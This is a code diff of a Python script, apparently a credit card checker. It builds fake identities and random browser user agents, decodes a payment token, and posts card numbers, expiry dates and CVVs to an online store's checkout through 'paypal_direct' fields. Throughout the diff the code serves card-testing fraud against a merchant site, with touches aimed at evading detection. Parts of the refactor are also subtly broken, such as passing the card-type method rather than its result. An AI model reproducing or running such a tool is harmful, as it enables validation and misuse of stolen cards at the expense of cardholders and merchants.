@@ -1,47 +1,74 @@
-import requests
+import random
 import re
+import names
+from requests import Session
+from dataclasses import dataclass
+import uuid
 import base64
+import requests
 import json
 import names
-import random
-from fake_useragent import UserAgent
-import time
-import uuid
-import time
-from requests import Session
-import time
 from bs4 import BeautifulSoup
-from dataclasses import dataclass
-
-
-
+import uuid
+from fake_useragent import UserAgent
 def paserX(data, first, last):
-    try:
-        return re.search(f'{first}(.*?){last}', data).group(1)
-    except:
-        return None 
-    
-Agent = UserAgent().random
+  try:
+    start = data.index( first ) + len( first )
+    end = data.index( last, start )
+    return data[start:end]
+  except ValueError:
+    return None 
 
-def generar_codigo_session():
-    codigo_session = str(uuid.uuid4())
-    return codigo_session
+class Autocomplet:
+    @classmethod
+    def SessionId(self):
+        self.id = str(uuid.uuid4())
+        return self.id
+    def cut_str(self, data:str=None, chainOne:str=None, chainTwo:str=None):
+
+        try:               return data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
+        except ValueError: return None 
+
+    def DecodeBear(self, dato:str = None):
+        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
+        self.bear_end = Autocomplet().cut_str(self._tokenEncoding, '"authorizationFingerprint":"', '","')
+
+        return self.bear_end
+
 @dataclass
-class pafiw:
-    def main(self, card):
+class b35:
+    def __init__(self, tarjeta):
+
+            partes = tarjeta.split("|")
+        
+            self.tarjeta = tarjeta
+            if len(partes) == 4:
+                self.cc = partes[0]
+                self.mes = partes[1]
+                self.ano = partes[2]
+                self.cvv = partes[3]
+    def detectar_tipo_tarjeta(self):
+        if self.cc.startswith("4"):
+            return "Visa"
+        elif self.cc.startswith("5"):
+            return "MasterCard"
+        elif self.cc.startswith("3"):
+            return "American Express"
+        elif self.cc.startswith("6"):
+            return "Discover"
+        else:
+            return "Desconocido"
+    def main(self):
         try:
-            
-            self.card = card
-            self.ccs = card.split('|')
-            if self.ccs[0].startswith("4"): self.brand = "VI"
-            if self.ccs[0].startswith("3"): self.brand = "AE"
-            elif self.ccs[0].startswith("5"): self.brand = "MC"
-
-            session = requests.Session()
-
+            session = Session()
             def generar_correo():
                 return f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
             CorreoRand = generar_correo()
+
+            username = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}"
+            Agent = UserAgent().random
+
+            #self.session.proxies = proxies
             headers = {
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                 'Accept-Language': 'es-ES,es;q=0.7',
@@ -261,11 +288,11 @@ class pafiw:
 
             data = {
                 'payment[method]': 'paypal_direct',
-                'payment[cc_type]': self.brand,
-                'payment[cc_number]': self.ccs[0],
-                'payment[cc_exp_month]': self.ccs[1],
-                'payment[cc_exp_year]': self.ccs[2],
-                'payment[cc_cid]': self.ccs[3],
+                'payment[cc_type]': self.detectar_tipo_tarjeta,
+                'payment[cc_number]': self.cc,
+                'payment[cc_exp_month]': self.mes,
+                'payment[cc_exp_year]': self.ano,
+                'payment[cc_cid]': self.cvv,
                 'form_key': fromkey2,
             }
 
@@ -293,11 +320,11 @@ class pafiw:
 
             data = {
                 'payment[method]': 'paypal_direct',
-                'payment[cc_type]': self.brand,
-                'payment[cc_number]': self.ccs[0],
-                'payment[cc_exp_month]': self.ccs[1],
-                'payment[cc_exp_year]': self.ccs[2],
-                'payment[cc_cid]': self.ccs[3],
+                'payment[cc_type]': self.detectar_tipo_tarjeta,
+                'payment[cc_number]': self.cc,
+                'payment[cc_exp_month]': self.mes,
+                'payment[cc_exp_year]': self.ano,
+                'payment[cc_cid]': self.cvv,
                 'form_key': fromkey2,
                 'cdr_ordercomment': '',
             }
